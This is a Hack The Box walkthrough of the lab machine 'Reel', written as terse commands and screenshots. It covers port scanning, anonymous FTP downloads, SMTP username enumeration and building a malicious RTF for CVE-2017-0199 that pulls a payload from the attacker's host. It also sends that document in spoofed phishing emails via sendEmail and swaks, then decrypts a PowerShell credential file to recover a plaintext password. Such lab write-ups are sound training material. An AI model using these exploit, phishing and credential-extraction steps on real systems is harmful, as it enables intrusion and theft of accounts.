---
description: https://app.hackthebox.com/machines/143
---

# Reel

## Nmap

```
nmap 10.10.10.77 -p- -sS -sV 

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)
25/tcp open  smtp?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

![](<../../.gitbook/assets/image (2084) (1).png>)

```bash
# Switch to binary mode
binary
# Get all files
mget *
```

cat readme.txt.

```
please email me any rtf format procedures - I'll review and convert.
new format / converted documents will be saved here.                                                                                                            
```

```
exiftool Windows\ Event\ Forwarding.docx 
```

![](<../../.gitbook/assets/image (2032).png>)

```
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 10.10.10.77 -D megabank.com 
```

![](<../../.gitbook/assets/image (2058) (1).png>)

{% embed url="https://www.hackingarticles.in/exploit-windows-10-pc-microsoft-rtf-file-cve-2017-0199#:~:text=https%3A//github.com/bhdresh/CVE%2D2017%2D0199.git" %}

```
python cve-2017-0199_toolkit.py -M gen -w Document.rtf -u http://10.10.14.14/viper.doc
```

```
use exploit/windows/fileformat/office_word_hta
```

![](<../../.gitbook/assets/image (2043) (1).png>)

![](<../../.gitbook/assets/image (2079) (1).png>)

```bash
# Syntax
sendEmail -t <Recipient> -f <SendingAddress> -s <IP> -u <Subject> -a <Attachment> 
sendEmail -t nico@megabank.com -f Test@Test.com -s 10.10.10.77 -u SPOOF -a /home/kali/.msf4/local/msf.doc

# Alternative
swaks -s "10.10.10.77"  -t "nico@megabank.com" -f "ViperOne@PentestEverything.viper" --header "Subject: Loot" --body "Hi" --attach /home/kali/.msf4/local/msf.doc
```

![](<../../.gitbook/assets/image (2049) (1).png>)

![](<../../.gitbook/assets/image (2086) (1).png>)

![](<../../.gitbook/assets/image (2073) (1).png>)

![](<../../.gitbook/assets/image (2066).png>)

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

```
$credential = Import-clixml -Path "C:\users\nico\desktop\cred.xml" ; $credential.GetNetworkCredential() | Format-List *
```

For the results

```
UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
